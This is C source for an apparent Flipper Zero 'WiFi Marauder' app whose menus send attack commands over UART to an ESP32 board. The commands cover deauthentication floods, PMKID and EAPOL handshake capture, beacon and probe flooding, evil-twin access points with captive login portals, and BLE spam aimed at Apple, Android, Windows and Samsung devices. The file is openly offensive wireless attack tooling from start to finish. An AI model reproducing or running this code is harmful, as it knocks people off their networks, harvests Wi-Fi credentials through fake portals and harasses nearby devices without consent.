#include "wifi_mp.h"
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

static const char* category_labels[WifiCatCount] = {
    "Deauth Attacks",
    "Handshake Capture",
    "Beacon Spam",
    "Evil Twin",
    "BLE Spam",
    "Recon / Scan",
};

static const char* deauth_options[] = {
    "Deauth All APs",
    "Deauth Target AP",
    "Deauth Specific Client",
    "Sweep All Channels",
    "Timed Burst (30s)",
};
static const uint8_t deauth_option_count = 5;

static const char* handshake_options[] = {
    "PMKID Attack (client-free)",
    "4-Way EAPOL Capture",
    "Passive EAPOL Monitor",
    "Multi-Target Capture",
};
static const uint8_t handshake_option_count = 4;

static const char* beacon_options[] = {
    "Custom SSID Flood",
    "Rickroll SSIDs",
    "Probe Flood",
    "Hidden AP Flood",
    "Pixel/Art SSIDs",
};
static const uint8_t beacon_option_count = 5;

static const char* evil_options[] = {
    "Open AP Clone",
    "WPA2 Clone",
    "Captive Portal",
    "Redirect Portal",
};
static const uint8_t evil_option_count = 4;

static const char* ble_options[] = {
    "Apple BLE Spam",
    "Android Fast Pair",
    "Windows Swift Pair",
    "Samsung Galaxy Spam",
    "All Devices Spam",
    "BLE Scanner",
    "Stop BLE Attack",
};
static const uint8_t ble_option_count = 7;

static const char* recon_options[] = {
    "Scan APs",
    "Scan Stations",
    "Probe Sniffer",
    "Beacon Monitor",
    "WPS Enumeration",
    "Show AP List",
    "Show Client List",
};
static const uint8_t recon_option_count = 7;

void wifi_mp_uart_send(WifiMarauder* app, const char* cmd) {
    size_t len = strlen(cmd);
    furi_hal_uart_tx(FuriHalUartIdUSART1, (const uint8_t*)cmd, len);
    furi_hal_uart_tx(FuriHalUartIdUSART1, (const uint8_t*)"\r\n", 2);
}

void wifi_mp_uart_send_fmt(WifiMarauder* app, const char* fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    wifi_mp_uart_send(app, buf);
}

static void append_output(WifiMarauder* app, const char* text) {
    furi_mutex_acquire(app->output_mutex, FuriWaitForever);
    furi_string_cat(app->output_buf, text);
    if(furi_string_size(app->output_buf) > 4096) {
        furi_string_right(app->output_buf, furi_string_size(app->output_buf) - 2048);
    }
    text_box_set_text(app->text_box, furi_string_get_cstr(app->output_buf));
    furi_mutex_release(app->output_mutex);
}

static void uart_rx_cb(FuriHalUartRxEvent event, size_t size, void* ctx) {
    WifiMarauder* app = ctx;
    if(event == FuriHalUartRxEventData) {
        uint8_t data[64];
        furi_hal_uart_read(FuriHalUartIdUSART1, data, size);
        furi_stream_buffer_send(app->rx_stream, data, size, 0);
    }
}

static int32_t rx_thread_fn(void* ctx) {
    WifiMarauder* app = ctx;
    uint8_t byte;
    char line[WIFI_LINE_BUF];
    uint16_t line_pos = 0;

    while(true) {
        size_t received = furi_stream_buffer_receive(app->rx_stream, &byte, 1, 100);
        if(received == 0) continue;
        if(byte == '\r') continue;

        if(byte == '\n' || line_pos >= WIFI_LINE_BUF - 2) {
            line[line_pos] = '\0';
            if(line_pos > 0) {
                char out[WIFI_LINE_BUF + 2];
                snprintf(out, sizeof(out), "%s\n", line);
                append_output(app, out);
            }
            line_pos = 0;
        } else {
            line[line_pos++] = (char)byte;
        }
    }
    return 0;
}

static void category_cb(void* ctx, uint32_t idx) {
    WifiMarauder* app = ctx;
    app->wifi.active_category = (WifiCategory)idx;
    scene_manager_handle_custom_event(app->scene_manager, WifiEvtSend);
}

void wifi_scene_main_on_enter(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->submenu);

    for(uint8_t i = 0; i < WifiCatCount; i++) {
        submenu_add_item(app->submenu, category_labels[i], i, category_cb, app);
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiViewMenu);
}

bool wifi_scene_main_on_event(void* ctx, SceneManagerEvent event) {
    WifiMarauder* app = ctx;
    if(event.type == SceneManagerEventTypeCustom && event.event == WifiEvtSend) {
        scene_manager_next_scene(app->scene_manager, WifiSceneCategory);
        return true;
    }
    return false;
}

void wifi_scene_main_on_exit(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->submenu);
}

static void sub_option_cb(void* ctx, uint32_t idx) {
    WifiMarauder* app = ctx;
    furi_string_reset(app->output_buf);
    text_box_set_text(app->text_box, "");

    switch(app->wifi.active_category) {
    case WifiCatDeauth:
        switch(idx) {
        case 0: wifi_mp_uart_send(app, CMD_DEAUTH_ALL); break;
        case 1:
            if(app->wifi.ap_count > 0) {
                wifi_mp_uart_send_fmt(app, CMD_DEAUTH_TARGET, app->wifi.ap_list[app->wifi.selected_ap].bssid);
            } else {
                wifi_mp_uart_send(app, CMD_SCAN_AP);
            }
            break;
        case 2: wifi_mp_uart_send(app, CMD_SCAN_STA); break;
        case 3: wifi_mp_uart_send(app, "attack -t deauth -a -ch 0"); break;
        case 4: wifi_mp_uart_send(app, "attack -t deauth -a -d 30000"); break;
        default: break;
        }
        break;
    case WifiCatHandshake:
        switch(idx) {
        case 0:
            if(app->wifi.ap_count > 0) {
                wifi_mp_uart_send_fmt(app, CMD_PMKID_ATTACK, app->wifi.ap_list[app->wifi.selected_ap].bssid);
            } else {
                wifi_mp_uart_send(app, CMD_SCAN_AP);
            }
            break;
        case 1: wifi_mp_uart_send(app, CMD_SNIFF_EAPOL); break;
        case 2: wifi_mp_uart_send(app, CMD_SNIFF_EAPOL); break;
        case 3: wifi_mp_uart_send(app, "sniffesp -c all"); break;
        default: break;
        }
        break;
    case WifiCatBeacon:
        switch(idx) {
        case 0: wifi_mp_uart_send_fmt(app, CMD_BEACON_SPAM, "pixmin_"); break;
        case 1: {
            static const char* rick[] = {
                "Never gonna give you up",
                "Never gonna let you down",
                "Never gonna run around",
                "and desert you",
            };
            for(uint8_t r = 0; r < 4; r++) {
                wifi_mp_uart_send_fmt(app, CMD_BEACON_SPAM, rick[r]);
            }
            break;
        }
        case 2: wifi_mp_uart_send(app, CMD_SNIFF_PROBE); break;
        case 3: wifi_mp_uart_send(app, "attack -t beacon -r 1"); break;
        case 4: wifi_mp_uart_send(app, "attack -t beacon -s \"pixel\""); break;
        default: break;
        }
        break;
    case WifiCatEvilTwin:
        switch(idx) {
        case 0:
            if(app->wifi.ap_count > 0) {
                wifi_mp_uart_send_fmt(app, "attack -t evil -b %s -o", app->wifi.ap_list[app->wifi.selected_ap].bssid);
            }
            break;
        case 1:
            if(app->wifi.ap_count > 0) {
                wifi_mp_uart_send_fmt(app, "attack -t evil -b %s", app->wifi.ap_list[app->wifi.selected_ap].bssid);
            }
            break;
        case 2: wifi_mp_uart_send_fmt(app, CMD_EVIL_PORTAL, "login"); break;
        case 3: wifi_mp_uart_send(app, "evilportal -m redirect"); break;
        default: break;
        }
        break;
    case WifiCatBLE:
        switch(idx) {
        case 0: wifi_mp_uart_send(app, CMD_BLE_SPAM_APPLE); break;
        case 1: wifi_mp_uart_send(app, CMD_BLE_SPAM_ANDROID); break;
        case 2: wifi_mp_uart_send(app, CMD_BLE_SPAM_WIN); break;
        case 3: wifi_mp_uart_send(app, CMD_BLE_SPAM_SAM); break;
        case 4: wifi_mp_uart_send(app, "blespam -t all"); break;
        case 5: wifi_mp_uart_send(app, "blescan"); break;
        case 6: wifi_mp_uart_send(app, CMD_BLE_STOP); break;
        default: break;
        }
        break;
    case WifiCatRecon:
        switch(idx) {
        case 0:
            app->wifi.ap_count = 0;
            wifi_mp_uart_send(app, CMD_SCAN_AP);
            break;
        case 1:
            app->wifi.sta_count = 0;
            wifi_mp_uart_send(app, CMD_SCAN_STA);
            break;
        case 2: wifi_mp_uart_send(app, CMD_SNIFF_PROBE); break;
        case 3: wifi_mp_uart_send(app, CMD_SNIFF_BEACON); break;
        case 4: wifi_mp_uart_send(app, "scanwps"); break;
        case 5: wifi_mp_uart_send(app, CMD_LIST_AP); break;
        case 6: wifi_mp_uart_send(app, CMD_LIST_STA); break;
        default: break;
        }
        break;
    default:
        break;
    }

    scene_manager_next_scene(app->scene_manager, WifiSceneOutput);
}

void wifi_scene_category_on_enter(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->sub_submenu);

    const char** opts = NULL;
    uint8_t count = 0;

    switch(app->wifi.active_category) {
    case WifiCatDeauth:    opts = deauth_options;    count = deauth_option_count;    break;
    case WifiCatHandshake: opts = handshake_options; count = handshake_option_count; break;
    case WifiCatBeacon:    opts = beacon_options;    count = beacon_option_count;    break;
    case WifiCatEvilTwin:  opts = evil_options;      count = evil_option_count;      break;
    case WifiCatBLE:       opts = ble_options;       count = ble_option_count;       break;
    case WifiCatRecon:     opts = recon_options;     count = recon_option_count;     break;
    default: break;
    }

    submenu_set_header(app->sub_submenu, category_labels[app->wifi.active_category]);
    for(uint8_t i = 0; i < count; i++) {
        submenu_add_item(app->sub_submenu, opts[i], i, sub_option_cb, app);
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiViewSubMenu);
}

bool wifi_scene_category_on_event(void* ctx, SceneManagerEvent event) {
    UNUSED(ctx);
    UNUSED(event);
    return false;
}

void wifi_scene_category_on_exit(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->sub_submenu);
}

void wifi_scene_output_on_enter(void* ctx) {
    WifiMarauder* app = ctx;
    text_box_set_font(app->text_box, TextBoxFontText);
    text_box_set_focus(app->text_box, TextBoxFocusEnd);
    view_dispatcher_switch_to_view(app->view_dispatcher, WifiViewOutput);
}

bool wifi_scene_output_on_event(void* ctx, SceneManagerEvent event) {
    WifiMarauder* app = ctx;
    if(event.type == SceneManagerEventTypeCustom && event.event == WifiEvtStopAttack) {
        wifi_mp_uart_send(app, CMD_STOP_SCAN);
        wifi_mp_uart_send(app, CMD_BLE_STOP);
        return true;
    }
    return false;
}

void wifi_scene_output_on_exit(void* ctx) {
    WifiMarauder* app = ctx;
    wifi_mp_uart_send(app, CMD_STOP_SCAN);
    wifi_mp_uart_send(app, CMD_BLE_STOP);
    text_box_reset(app->text_box);
}

void wifi_scene_target_on_enter(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->sub_submenu);
    submenu_set_header(app->sub_submenu, "Select Target AP");
    for(uint8_t i = 0; i < app->wifi.ap_count; i++) {
        submenu_add_item(app->sub_submenu, app->wifi.ap_list[i].ssid, i, sub_option_cb, app);
    }
    if(app->wifi.ap_count == 0) {
        submenu_add_item(app->sub_submenu, "No APs -- scan first", 0xFF, sub_option_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, WifiViewSubMenu);
}

bool wifi_scene_target_on_event(void* ctx, SceneManagerEvent event) {
    UNUSED(ctx);
    UNUSED(event);
    return false;
}

void wifi_scene_target_on_exit(void* ctx) {
    WifiMarauder* app = ctx;
    submenu_reset(app->sub_submenu);
}

static const SceneManagerHandlers wifi_scene_handlers = {
    .on_enter_handlers = {
        wifi_scene_main_on_enter,
        wifi_scene_category_on_enter,
        wifi_scene_target_on_enter,
        wifi_scene_output_on_enter,
    },
    .on_event_handlers = {
        wifi_scene_main_on_event,
        wifi_scene_category_on_event,
        wifi_scene_target_on_event,
        wifi_scene_output_on_event,
    },
    .on_exit_handlers = {
        wifi_scene_main_on_exit,
        wifi_scene_category_on_exit,
        wifi_scene_target_on_exit,
        wifi_scene_output_on_exit,
    },
    .scene_num = WifiSceneCount,
};

static bool wifi_custom_cb(void* ctx, uint32_t event) {
    WifiMarauder* app = ctx;
    return scene_manager_handle_custom_event(app->scene_manager, event);
}

static bool wifi_back_cb(void* ctx) {
    WifiMarauder* app = ctx;
    return scene_manager_handle_back_event(app->scene_manager);
}

static WifiMarauder* wifi_marauder_alloc(void) {
    WifiMarauder* app = malloc(sizeof(WifiMarauder));
    memset(app, 0, sizeof(WifiMarauder));

    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->output_buf = furi_string_alloc();
    app->output_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->rx_stream = furi_stream_buffer_alloc(MARAUDER_BUF_SIZE, 1);

    app->scene_manager = scene_manager_alloc(&wifi_scene_handlers, app);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, wifi_custom_cb);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, wifi_back_cb);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, WifiViewMenu, submenu_get_view(app->submenu));

    app->sub_submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, WifiViewSubMenu, submenu_get_view(app->sub_submenu));

    app->text_box = text_box_alloc();
    view_dispatcher_add_view(app->view_dispatcher, WifiViewOutput, text_box_get_view(app->text_box));

    furi_hal_uart_init(FuriHalUartIdUSART1, MARAUDER_UART_BAUD);
    furi_hal_uart_set_irq_cb(FuriHalUartIdUSART1, uart_rx_cb, app);

    app->rx_thread = furi_thread_alloc_ex("WifiRx", 2048, rx_thread_fn, app);
    furi_thread_start(app->rx_thread);

    wifi_mp_uart_send(app, CMD_VERSION);

    return app;
}

static void wifi_marauder_free(WifiMarauder* app) {
    wifi_mp_uart_send(app, CMD_STOP_SCAN);
    wifi_mp_uart_send(app, CMD_BLE_STOP);

    furi_thread_flags_set(furi_thread_get_id(app->rx_thread), 0x01);
    furi_thread_join(app->rx_thread);
    furi_thread_free(app->rx_thread);

    furi_hal_uart_deinit(FuriHalUartIdUSART1);

    view_dispatcher_remove_view(app->view_dispatcher, WifiViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, WifiViewSubMenu);
    view_dispatcher_remove_view(app->view_dispatcher, WifiViewOutput);

    submenu_free(app->submenu);
    submenu_free(app->sub_submenu);
    text_box_free(app->text_box);

    scene_manager_free(app->scene_manager);
    view_dispatcher_free(app->view_dispatcher);

    furi_stream_buffer_free(app->rx_stream);
    furi_mutex_free(app->output_mutex);
    furi_string_free(app->output_buf);

    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);

    free(app);
}

int32_t wifi_marauder_app(void* p) {
    UNUSED(p);
    WifiMarauder* app = wifi_marauder_alloc();
    scene_manager_next_scene(app->scene_manager, WifiSceneMain);
    view_dispatcher_run(app->view_dispatcher);
    wifi_marauder_free(app);
    return 0;
}
